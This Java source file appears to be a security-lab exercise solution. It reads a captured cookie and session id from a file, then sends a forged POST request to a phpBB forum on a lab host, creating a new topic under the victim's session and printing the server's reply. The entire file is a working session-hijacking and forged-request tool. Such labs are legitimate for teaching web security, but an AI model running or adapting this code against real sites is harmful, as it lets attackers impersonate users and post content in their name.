import java.io.*;
import java.net.*;

public class HTTPSimpleForge {

   public static void main(String[] args) throws IOException {
   try {
	FileReader input = new FileReader("task1input.txt"); 
	BufferedReader buff = new BufferedReader(input); 
	String cookie = buff.readLine(); 
	String sessionid = buff.readLine(); 
	buff.close(); 
	
	int responseCode;
	InputStream responseIn=null;
	
	// URL to be forged.
	URL url = new URL ("http://www.xsslabphpbb.com/posting.php?mode=newtopic&f=1");
	
	// URLConnection instance is created to further parameterize a 
	// resource request past what the state members of URL instance 
	// can represent.
	URLConnection urlConn = url.openConnection();
	if (urlConn instanceof HttpURLConnection) {
		urlConn.setConnectTimeout(60000);
		urlConn.setReadTimeout(90000);
	}
		
	// addRequestProperty method is used to add HTTP Header Information.
	// Here we add User-Agent HTTP header to the forged HTTP packet.
	
	//urlConn.addRequestProperty("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
	
	urlConn.addRequestProperty("Cookie", cookie);
	urlConn.addRequestProperty("Content-Type","application/x-www-form-urlencoded");
	urlConn.addRequestProperty("Content-Length","249");
	//HTTP Post Data which includes the information to be sent to the server.
	//String data="username=admin&seed=admin%40seed.com";
	String data = "subject=XSS&addbbcode18=%23444444&addbbcode20=0&helpbox=Quote+text%3A+%5Bquote%5Dtext%5B%2Fquote%5D++%28alt%2Bq%29&message=A+forged+message&poll_title=&add_poll_option_text=&poll_length=&mode=newtopic&sid=" +sessionid + "&f=1&post=Submit";
	// DoOutput flag of URL Connection should be set to true 
	// to send HTTP POST message.
	urlConn.setDoOutput(true);
		
	// OutputStreamWriter is used to write the HTTP POST data 
	// to the url connection.        	
        OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());
        wr.write(data);
        wr.flush();

	// HttpURLConnection a subclass of URLConnection is returned by 
	// url.openConnection() since the url  is an http request.			
	if (urlConn instanceof HttpURLConnection) {
		HttpURLConnection httpConn = (HttpURLConnection) urlConn;
		
		// Contacts the web server and gets the status code from 
		// HTTP Response message.
		responseCode = httpConn.getResponseCode();
		System.out.println("Response Code = " + responseCode);
	
		// HTTP status code HTTP_OK means the response was 
		// received successfully.
		if (responseCode == HttpURLConnection.HTTP_OK) {

			// Get the input stream from url connection object.
			responseIn = urlConn.getInputStream();
			
			// Create an instance for BufferedReader 
			// to read the response line by line.
			BufferedReader buf_inp = new BufferedReader(
					new InputStreamReader(responseIn));
			String inputLine;
			while((inputLine = buf_inp.readLine())!=null) {
				System.out.println(inputLine);
			}
		}
	}
     } catch (MalformedURLException e) {
		e.printStackTrace();
     }
	catch (FileNotFoundException e) {
		System.out.println("task1input.txt not found");
	}
	catch (IOException e) {
		System.out.println("input ");  
	} 
   }
}
